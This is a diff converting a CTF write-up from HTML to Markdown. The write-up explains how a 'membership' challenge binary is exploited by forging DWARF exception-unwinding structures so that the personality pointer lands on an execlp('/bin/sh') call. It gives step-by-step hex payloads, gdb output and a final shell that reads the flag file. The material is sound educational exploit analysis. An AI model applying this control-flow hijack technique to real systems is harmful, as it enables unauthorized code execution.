-  3. When creating a fake **cie** struct, we make the personality function pointer <span class="lang:default decode:true  crayon-inline">0x8048E97</span> , where it does <span class="lang:default decode:true  crayon-inline">execlp(&#8220;/bin/sh&#8221;, &#8220;/bin/sh&#8221;, 0)</span> , and get a shell!!
+  3. When creating a fake **cie** struct, we make the personality function pointer `0x8048E97`, where it does `execlp("/bin/sh", "/bin/sh", 0)`, and get a shell!!
 
-<p style="text-align: left;">
-  Note that the some of the fields in structs are relative offsets, so we need to plan where to put things and link them correctly.
-</p>
+Note that the some of the fields in structs are relative offsets, so we need to plan where to put things and link them correctly.
 
-<h2 style="text-align: left;">
-  4-1. Trigger
-</h2>
+### Trigger
 
-<p style="text-align: left;">
-  Let&#8217;s start with a simple payload that would pass the check and trigger the bug.
-</p>
+Let's start with a simple payload that would pass the check and trigger the bug.
 
-<pre class="nums:false lang:default highlight:0 decode:true" title="payload">00000000  73 74 64 63 68 70 69 65  0a 41 01 b1 2e 40 41 41  |stdchpie.A...@AA|
+```
+00000000  73 74 64 63 68 70 69 65  0a 41 01 b1 2e 40 41 41  |stdchpie.A...@AA|
 00000010  41 41 41 41 41 41 41 41  41                       |AAAAAAAAA|
-00000019</pre>
+00000019
+```
 
-<pre class="nums:false lang:default highlight:0 decode:true" title="output">(gdb) r &lt; payload
+```
+(gdb) r &lt; payload
 Starting program: /tmp/.ppp/./membership &lt; trigger
 userid :: password ::
 Program received signal SIGSEGV, Segmentation fault.
@@ -826,33 +821,37 @@ nested
 Program received signal SIGSEGV, Segmentation fault.
 0x08048cc5 in ?? ()
 (gdb) x/wx 0x402eb101
-0x402eb101:     0x41414141</pre>
+0x402eb101:     0x41414141
+```
 
-As we can see in action, this payload triggers the bug and causes infinite SIGSEGV.  
+As we can see in action, this payload triggers the bug and causes infinite SIGSEGV.
 We currently chose 0x402eb101 for no particular reason, but we can see that memory is successfully written.
 
-## 4-2. cache\_entry & p\_eh\_frame\_hdr construction
+### cache\_entry & p\_eh\_frame\_hdr construction
 
 Now, we overwrite **frame\_hdr\_cache_head** to point to our **stdin** buffer.
 
 We are going to start building fake structs from our **buffer + 0x1c**.
 
-So what values should we use?  
-To not worry about the search too much, we are going to set **pc_low** to **0x0** and **pc_high** to **0xFFFFFFFF**. This basically says that this cache entry should be used for any exception thrown in this range of addresses &#8212; so we&#8217;ll catch everything. Also, to make it easy to do math, we are going to make **load_base** to ****. Finally, we have to set **p\_eh\_frame_hdr** pointer to the fake **Elf32_Phdr** struct. We will put this fake phdr struct right after our fake cache_entry struct that we are currently building. The rest of the fields are not really used (for our purpose), so we can put dummy values.
+So what values should we use?
+To not worry about the search too much, we are going to set **pc_low** to **0x0** and **pc_high** to **0xFFFFFFFF**. This basically says that this cache entry should be used for any exception thrown in this range of addresses &mdash; so we'll catch everything. Also, to make it easy to do math, we are going to make **load_base** to ****. Finally, we have to set **p\_eh\_frame_hdr** pointer to the fake **Elf32_Phdr** struct. We will put this fake phdr struct right after our fake cache_entry struct that we are currently building. The rest of the fields are not really used (for our purpose), so we can put dummy values.
 
 This gives us this:
 
-<pre class="toolbar:2 nums:false lang:default decode:true">*frame_hdr_cache_head:
+```
+*frame_hdr_cache_head:
  | pc_low = 0x00000000
  | pc_high = 0xFFFFFFFF
  | load_base = 0x00000000
  | p_eh_frame_hdr = 0x40025034
  | p_dynamic = 0x43434343
- | link = 0x00000000</pre>
+ | link = 0x00000000
+```
 
 For **p\_eh\_frame_hdr** struct, we only care about **p_vaddr** which is used to calculate **hdr** (unw\_eh\_frame_hdr).
 
-<pre class="toolbar:2 nums:false lang:default decode:true">*p_eh_frame_hdr:
+```
+*p_eh_frame_hdr:
  | p_type = 0x6474e550
  | p_offset = 0x44444444
  | p_vaddr = 0x40025054
@@ -860,18 +859,22 @@ For **p\_eh\_frame_hdr** struct, we only care about **p_vaddr** which is used t
  | p_filesz = 0x46464646
  | p_memsz = 0x47474747
  | p_flags = 0x48484848
- | p_align = 0x49494949</pre>
+ | p_align = 0x49494949
+```
 
-Let&#8217;s see in action.
+Let's see in action.
 
-<pre class="nums:false lang:default highlight:0 decode:true" title="payload">00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
+```
+00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
 00000010  02 40 41 41 41 41 41 42  41 42 42 42 00 00 00 00  |.@AAAAABABBB....|
 00000020  ff ff ff ff 00 00 00 00  34 50 02 40 43 43 43 43  |........4P.@CCCC|
 00000030  00 00 00 00 50 e5 74 64  44 44 44 44 54 50 02 40  |....P.tdDDDDTP.@|
 00000040  45 45 45 45 46 46 46 46  47 47 47 47 48 48 48 48  |EEEEFFFFGGGGHHHH|
-00000050  49 49 49 49                                       |IIII|</pre>
+00000050  49 49 49 49                                       |IIII|
+```
 
-<pre class="nums:false lang:default highlight:0 decode:true" title="output">Breakpoint 1, 0x0804901a in ?? ()
+```
+Breakpoint 1, 0x0804901a in ?? ()
 (gdb) x/20wx 0x402eb118
 0x402eb118:     0x4002501c      0x00000000      0x402cf000      0x402e9038
 0x402eb128:     0x402cf000      0x402cf0b4      0x402cf074      0x402eb168
@@ -889,78 +892,88 @@ Let&#8217;s see in action.
 0x40025044:     0x46464646      0x47474747      0x48484848      0x49494949
 0x40025054:     0x00000000      0x00000000      0x00000000      0x00000000
 0x40025064:     0x00000000      0x00000000      0x00000000      0x00000000
-0x40025074:     0x00000000      0x00000000      0x00000000      0x00000000</pre>
+0x40025074:     0x00000000      0x00000000      0x00000000      0x00000000
+```
 
-So, this payload basically lets us to execute <span class="lang:default decode:true  crayon-inline ">goto found;</span>  code (*unwind-dw2-fde-dip.c:225*) since the <span class="lang:default decode:true  crayon-inline ">data->pc</span>  will be in between **pc_low** and **pc_high**.
+So, this payload basically lets us to execute `goto found;`  code (*unwind-dw2-fde-dip.c:225*) since the `data->pc` will be in between **pc_low** and **pc_high**.
 
-Then, on line 315, **hdr** is calculated by adding **p\_eh\_frame\_hdr->p\_vaddr** and **load_base**, thus pointing **0x40025054**.  
+Then, on line 315, **hdr** is calculated by adding **p\_eh\_frame\_hdr->p\_vaddr** and **load_base**, thus pointing **0x40025054**.
 Time to build a fake **hdr** struct!
 
-## 4-3. hdr & table construction
+### hdr & table construction
 
-Starting at +0x54 from our buffer comes the **hdr** struct.  
-It&#8217;s a 4 byte struct and we fill in reasonable values here, according to the encoding scheme mentioned above.
+Starting at +0x54 from our buffer comes the **hdr** struct.
+It's a 4 byte struct and we fill in reasonable values here, according to the encoding scheme mentioned above.
 
-<pre class="toolbar:2 nums:false lang:default decode:true">*hdr:
+```
+*hdr:
  | version = 0x01
  | eh_frame_ptr_enc = 0x1b (DW_EH_PE_pcrel | DW_EH_PE_sdata4)
  | fde_count_enc = 0x03 (DW_EH_PE_absptr | DW_EH_PE_udata4)
- | table_enc = 0x3b (DW_EH_PE_datarel | DW_EH_PE_sdata4)</pre>
+ | table_enc = 0x3b (DW_EH_PE_datarel | DW_EH_PE_sdata4)
+ ```
 
-Then, as we saw earlier, **eh_frame** is read. Since the value is supposedly encoded with <span class="lang:default decode:true  crayon-inline ">(DW_EH_PE_pcrel | DW_EH_PE_sdata4)</span> , this value in our data should be an offset from where the **hdr** is. However, the value of **eh_frame** isn&#8217;t really related to what we do, so we can put any value (**read\_encoded\_value\_with\_base** actually does the calculation given the base to correctly compute eh_frame&#8217;s value).
+Then, as we saw earlier, **eh_frame** is read. Since the value is supposedly encoded with `(DW_EH_PE_pcrel | DW_EH_PE_sdata4)`, this value in our data should be an offset from where the **hdr** is. However, the value of **eh_frame** isn't really related to what we do, so we can put any value (**read\_encoded\_value\_with\_base** actually does the calculation given the base to correctly compute eh_frame's value).
 
-<span style="line-height: 1.5em;">Ok, next check is the following:</span>
+Ok, next check is the following:
 
-<pre class="toolbar:2 nums:false lang:c decode:true">if (hdr-&gt;fde_count_enc != DW_EH_PE_omit
-    && hdr-&gt;table_enc == (DW_EH_PE_datarel | DW_EH_PE_sdata4))</pre>
+```
+if (hdr-&gt;fde_count_enc != DW_EH_PE_omit
+    && hdr-&gt;table_enc == (DW_EH_PE_datarel | DW_EH_PE_sdata4))
+```
 
-We have picked the values for encoding schems such that we satisfy both conditions.  
-Then, **fde_count** is read.  
+We have picked the values for encoding schems such that we satisfy both conditions.
+Then, **fde_count** is read.
 Since we do not want to create more than one set of fake structs (to be searched with binary search later), we will force this to be 1.
 
 So with this data appended, we so far have this as our payload:
 
-<pre class="nums:false lang:default highlight:0 decode:true" title="payload">00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
-00000010  02 40 41 41 41 41 41 42  41 42 42 42 00 00 00 00  |.@AAAAABABBB....|
-00000020  ff ff ff ff 00 00 00 00  34 50 02 40 43 43 43 43  |........4P.@CCCC|
-00000030  00 00 00 00 50 e5 74 64  44 44 44 44 54 50 02 40  |....P.tdDDDDTP.@|
-00000040  45 45 45 45 46 46 46 46  47 47 47 47 48 48 48 48  |EEEEFFFFGGGGHHHH|
-00000050  49 49 49 49 01 1b 03 3b  4a 4a 4a 4a 01 00 00 00  |IIII...;JJJJ....|</pre>
-
-Then, the **table** comes next. *fde_table* struct has two fields: **initial_loc** and **fde**.
-
-As mentioned earlier, in order for the search to succeed, we need to satisfy <span class="lang:default decode:true  crayon-inline ">table[mid].initial_loc + data_base <= data->pc < table[mid].initial_loc + data_base + range</span> .
-
-Note that data_base is pointing at **hdr** (**0x40025054**). So we can set **initial_loc** to **0xBFFDAFAC** such that <span class="lang:default decode:true  crayon-inline ">initial_loc + data_base == 0x40025054 + 0xBFFDAFAC  == 0x0</span> .
-
-Also, the **fde** field is actually an (signed) offset from **hdr** &#8212; due to (DW\_EH\_PE\_datarel | DW\_EH\_PE\_sdata4) encoding. So, we set it to **0x14** to indicate that our fake **dwarf_fde** struct will be located at **0x40025068**.
-
-Fake **hdr** and **table** construction is done, and we now have this:
-
-<pre class="nums:false lang:default highlight:0 decode:true" title="payload">00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
+```
+00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
 00000010  02 40 41 41 41 41 41 42  41 42 42 42 00 00 00 00  |.@AAAAABABBB....|
 00000020  ff ff ff ff 00 00 00 00  34 50 02 40 43 43 43 43  |........4P.@CCCC|
 00000030  00 00 00 00 50 e5 74 64  44 44 44 44 54 50 02 40  |....P.tdDDDDTP.@|
 00000040  45 45 45 45 46 46 46 46  47 47 47 47 48 48 48 48  |EEEEFFFFGGGGHHHH|
 00000050  49 49 49 49 01 1b 03 3b  4a 4a 4a 4a 01 00 00 00  |IIII...;JJJJ....|
-00000060  ac af fd bf 14 00 00 00                           |........|</pre>
+```
 
-The current payload, when fed to the program, will result in a crash since it will read an invalid value for the range.  
-To make <span class="lang:default decode:true  crayon-inline ">data->pc < initial_loc + data_base + range</span>  true, we need to construct a fake **dwarf_fde** now.
+Then, the **table** comes next. *fde_table* struct has two fields: **initial_loc** and **fde**.
 
-## 4-4. fde & cie construction
+As mentioned earlier, in order for the search to succeed, we need to satisfy `table[mid].initial_loc + data_base <= data->pc < table[mid].initial_loc + data_base + range`.
+
+Note that data_base is pointing at **hdr** (**0x40025054**). So we can set **initial_loc** to **0xBFFDAFAC** such that `initial_loc + data_base == 0x40025054 + 0xBFFDAFAC  == 0x0`.
+
+Also, the **fde** field is actually an (signed) offset from **hdr** &#8212; due to (DW\_EH\_PE\_datarel | DW\_EH\_PE\_sdata4) encoding. So, we set it to **0x14** to indicate that our fake **dwarf_fde** struct will be located at **0x40025068**.
+
+Fake **hdr** and **table** construction is done, and we now have this:
+
+```
+00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
+00000010  02 40 41 41 41 41 41 42  41 42 42 42 00 00 00 00  |.@AAAAABABBB....|
+00000020  ff ff ff ff 00 00 00 00  34 50 02 40 43 43 43 43  |........4P.@CCCC|
+00000030  00 00 00 00 50 e5 74 64  44 44 44 44 54 50 02 40  |....P.tdDDDDTP.@|
+00000040  45 45 45 45 46 46 46 46  47 47 47 47 48 48 48 48  |EEEEFFFFGGGGHHHH|
+00000050  49 49 49 49 01 1b 03 3b  4a 4a 4a 4a 01 00 00 00  |IIII...;JJJJ....|
+00000060  ac af fd bf 14 00 00 00                           |........|
+```
+
+The current payload, when fed to the program, will result in a crash since it will read an invalid value for the range.
+To make `data->pc < initial_loc + data_base + range`  true, we need to construct a fake **dwarf_fde** now.
+
+### fde & cie construction
 
 As a final step, we are going to construct **fde** and **cie** records in our payload.
 
 **dwarf_fde** struct has **length**, **CIE_delta**, and **pc_begin** fields (followed by *fde_augmentation length*, which should be 0).
 
-We are going to make the **length** **0x1C**, and **CIE_delta** to **0xFFFFFFE4** (such that <span class="lang:default decode:true  crayon-inline ">&CIE_delta &#8211; CIE_delta == 0x40025088</span> &#8212; this will be explained later). We will set **pc_begin** to 0x0 (doesn&#8217;t really matter what we put here).
+We are going to make the **length** **0x1C**, and **CIE_delta** to **0xFFFFFFE4** (such that `&CIE_delta &mdash; CIE_delta == 0x40025088` &mdash; this will be explained later). We will set **pc_begin** to 0x0 (doesn't really matter what we put here).
 
-What comes after **pc_begin** is the **range**. To explain a little bit, on line 412 in *unwind-dw2-fde-dip.c*, **range** is read from** f->pc\_begin[f\_enc_size]** where **f\_enc\_size** is **4**, making the 4 byte right after **pc_begin** be the **range**. Since we made the **init_loc** to be **0x0**, we will make the **range** to be **0xFFFFFFFF**. Then, we pad the last few bytes (so, technically we can fix the length, but that&#8217;s what we used during the competition).
+What comes after **pc_begin** is the **range**. To explain a little bit, on line 412 in *unwind-dw2-fde-dip.c*, **range** is read from** f->pc\_begin[f\_enc_size]** where **f\_enc\_size** is **4**, making the 4 byte right after **pc_begin** be the **range**. Since we made the **init_loc** to be **0x0**, we will make the **range** to be **0xFFFFFFFF**. Then, we pad the last few bytes (so, technically we can fix the length, but that's what we used during the competition).
 
 This yields our payload to be:
 
-<pre class="nums:false lang:default highlight:0 decode:true" title="payload">00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
+```
+00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
 00000010  02 40 41 41 41 41 41 42  41 42 42 42 00 00 00 00  |.@AAAAABABBB....|
 00000020  ff ff ff ff 00 00 00 00  34 50 02 40 43 43 43 43  |........4P.@CCCC|
 00000030  00 00 00 00 50 e5 74 64  44 44 44 44 54 50 02 40  |....P.tdDDDDTP.@|
@@ -968,33 +981,38 @@ This yields our payload to be:
 00000050  49 49 49 49 01 1b 03 3b  14 00 00 00 01 00 00 00  |IIII...;........|
 00000060  ac af fd bf 14 00 00 00  1c 00 00 00 e4 ff ff ff  |................|
 00000070  00 00 00 00 ff ff ff ff  00 00 00 00 00 00 00 00  |................|
-00000080  00 00 00 00 00 00 00 00                           |........|</pre>
+00000080  00 00 00 00 00 00 00 00                           |........|
+```
 
 We are almost there!!!
 
-Above payload will result in <span class="lang:default decode:true  crayon-inline ">data->ret</span>  to contain a pointer to our FDE struct and return to **\_Unwind\_Find_FDE**.
+Above payload will result in `data->ret` to contain a pointer to our FDE struct and return to **\_Unwind\_Find_FDE**.
 
 In **\_Unwind\_Find_FDE**, nothing interesting happens, and the same (a pointer to our fake FDE struct) is returned.
 
 We are now back to **uw\_frame\_state_for** function (line 1180 in *unwind-dw2.c*). Since **fde** is not null, **extract\_cie\_info** is called with the **cie** pointer that is based on our **fde**.
 
-<pre class="nums:false lang:c decode:true" title="unwind-dw2.c">1195
+```
+1195
 1196   cie = get_cie (fde);
 1197   insn = extract_cie_info (cie, context, fs);
 1198   if (insn == NULL)
 1199     /* CIE contained unknown augmentation.  */
 1200     return _URC_FATAL_PHASE1_ERROR;
-1201</pre>
+1201
+```
 
-<pre class="start-line:152 lang:default decode:true" title="unwind-dw2-fde.h">/* Locate the CIE for a given FDE.  */
+```
+/* Locate the CIE for a given FDE.  */
 
 static inline const struct dwarf_cie *
 get_cie (const struct dwarf_fde *f)
 {
   return (const void *)&f-&gt;CIE_delta - f-&gt;CIE_delta;
-}</pre>
+}
+```
 
-Looking at the **get_cie** function, we can see why we put **0xFFFFFFE4** for **CIE_delta** value in our FDE struct. With our setup, **get_cie** will return the CIE struct&#8217;s address, which will be right after our fake FDE struct (aka 0x40025088).
+Looking at the **get_cie** function, we can see why we put **0xFFFFFFE4** for **CIE_delta** value in our FDE struct. With our setup, **get_cie** will return the CIE struct's address, which will be right after our fake FDE struct (aka 0x40025088).
 
 Now, we have 1 final function that we need to understand: **extract\_cie\_info**.
 
@@ -1002,9 +1020,10 @@ This function is mostly parsing stuff and filling in the *\_Unwind\_Frame_State*
 
 **dwarf_cie** struct has **length**, **CIE_id**, **version**, and **augmentation** &#8212; and depending on augmentation content, more data follows.
 
-Here&#8217;s the values we set for our fake CIE struct:
+Here's the values we set for our fake CIE struct:
 
-<pre class="toolbar:2 nums:false lang:default decode:true">*cie:
+```
+*cie:
  | length = 0x1c
  | CIE_id = 0x0
  | version = 0x1
@@ -1016,23 +1035,25 @@ Here&#8217;s the values we set for our fake CIE struct:
  - personality_enc = 0x00 (byte)
  - personality_ptr = 0x41424344 (4 bytes)
  - LSDA encoding = 0x00 (byte)
- - FDE_encoding = 0x1b (DW_EH_PE_pcrel | DW_EH_PE_sdata4)</pre>
+ - FDE_encoding = 0x1b (DW_EH_PE_pcrel | DW_EH_PE_sdata4)
+```
 
-Data that follows after augmentation string (code\_alignment, data\_alignment, return\_addr\_col) are read in first.  
-We chose these values just because we saw these in normal CIE struct, but it shouldn&#8217;t matter what the values are.
+Data that follows after augmentation string (code\_alignment, data\_alignment, return\_addr\_col) are read in first.
+We chose these values just because we saw these in normal CIE struct, but it shouldn't matter what the values are.
 
-Then, the rest of the data is parsed as augmentation contents (aka &#8216;zPLR&#8217;).
+Then, the rest of the data is parsed as augmentation contents (aka &#8216;zPLR').
 
-  1. If the first byte is &#8216;z&#8217;, it sets <span class="lang:default decode:true  crayon-inline ">fs->saw_z flag</span>  and note that the length of the extra augmentation data (which follows the length itself) is **0x07**.
-  2. &#8216;P&#8217; indicates a personality routine  is specified in CIE (extra) augmentation, and basically read the **personality_ptr** value (4-byte) based on the **personality_enc** encoding scheme &#8212; which we set as 0x0 to make it absptr type.
-  3. &#8216;L&#8217; indicates a byte showing how the LSDA pointer is encoded. No idea what that is, but it&#8217;s not relevant &#8212; we put 0x0.
-  4. &#8216;R&#8217; indicates a byte indicating how FDE addresses are encoded. We put some sane value that we saw earlier, but shouldn&#8217;t matter either.
+1. If the first byte is &#8216;z', it sets <span class="lang:default decode:true  crayon-inline ">fs->saw_z flag</span>  and note that the length of the extra augmentation data (which follows the length itself) is **0x07**.
+2. &#8216;P' indicates a personality routine  is specified in CIE (extra) augmentation, and basically read the **personality_ptr** value (4-byte) based on the **personality_enc** encoding scheme &#8212; which we set as 0x0 to make it absptr type.
+3. &#8216;L' indicates a byte showing how the LSDA pointer is encoded. No idea what that is, but it's not relevant &#8212; we put 0x0.
+4. &#8216;R' indicates a byte indicating how FDE addresses are encoded. We put some sane value that we saw earlier, but shouldn't matter either.
 
 Alright, now with some padding bytes to make the total length **0x1c**, we are set.
 
 Thus far, we have built the following payload:
 
-<pre class="nums:false lang:default highlight:0 decode:true" title="payload">00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
+```
+00000000  73 74 64 63 68 70 69 65  0a 41 18 b1 2e 40 1c 50  |stdchpie.A...@.P|
 00000010  02 40 41 41 41 41 41 42  41 42 42 42 00 00 00 00  |.@AAAAABABBB....|
 00000020  ff ff ff ff 00 00 00 00  34 50 02 40 43 43 43 43  |........4P.@CCCC|
 00000030  00 00 00 00 50 e5 74 64  44 44 44 44 54 50 02 40  |....P.tdDDDDTP.@|
@@ -1042,11 +1063,13 @@ Thus far, we have built the following payload:
 00000070  00 00 00 00 ff ff ff ff  00 00 00 00 00 00 00 00  |................|
 00000080  00 00 00 00 00 00 00 00  1c 00 00 00 00 00 00 00  |................|
 00000090  01 7a 50 4c 52 00 01 7c  08 07 00 44 43 42 41 00  |.zPLR..|...DCBA.|
-000000a0  1b 00 00 00                                       |....|</pre>
+000000a0  1b 00 00 00                                       |....|
+```
 
 And corresponding output when we run this payload against the binary:
 
-<pre class="nums:false lang:default highlight:0 decode:true" title="output">(gdb) r &lt; payload
+```
+(gdb) r &lt; payload
 Starting program: /tmp/.ppp/./membership &lt; payload
 userid :: password ::
 Program received signal SIGSEGV, Segmentation fault.
@@ -1062,33 +1085,34 @@ Continuing.
 
 Program received signal SIGSEGV, Segmentation fault.
 0x41424344 in ?? ()
-(gdb)</pre>
+(gdb)
+```
 
 YAY!!! WE HAVE EIP CONTROL!!!!111!!11!
 
 Ok, now on to the final and easiest step: getting a shell.
 
-## 4-5. Give me a shell
+### Give me a shell
 
-Remember (from a while ago&#8230;) that there was code that does <span class="lang:default decode:true  crayon-inline ">execlp(&#8220;/bin/sh&#8221;, &#8220;/bin/sh&#8221;, 0)</span> ?  
-For those who don&#8217;t remember, it&#8217;s located at <span class="lang:default decode:true  crayon-inline ">0x8048E97</span> .
+Remember (from a while ago) that there was code that does `execlp("/bin/sh", "/bin/sh", 0)`?
+For those who don't remember, it's located at `0x8048E97`.
 
 All we have to do at this point is to replace **0x41424344** (personality routine pointer) to **0x8048e97**.
 
 AND
 
-<pre class="nums:false lang:sh decode:true" title="WIN!">$ cat payload - | /home/membership/membership
+```
+$ cat payload - | /home/membership/membership
 userid :: password :: nested
 whoami
 membership
 cat /home/membership/key
-G4R4Ge_BaND_wANNAB3</pre>
+G4R4Ge_BaND_wANNAB3
+```
 
 Voila! We have our shell (and the flag, of course!)
 
-&nbsp;
-
-# 5. Closing
+## Closing
 
 I hope you enjoyed reading this write-up. (Although I suspect not.. due to its obscene length)
 
@@ -1098,8 +1122,4 @@ Try it while their server is up!! Otherwise you will have to patch the binary su
 
 Thank you for reading, and feel free to leave comments if you have any questions or suggestions.
 
-&nbsp;
-
-Write-up by Cai (Brian Pak) [<a href="https://www.bpak.org" target="_blank">https://www.bpak.org</a>]
-
-&nbsp;
+_Write-up by Cai (Brian Pak) [<a href="https://www.bpak.org" target="_blank">https://www.bpak.org</a>]_
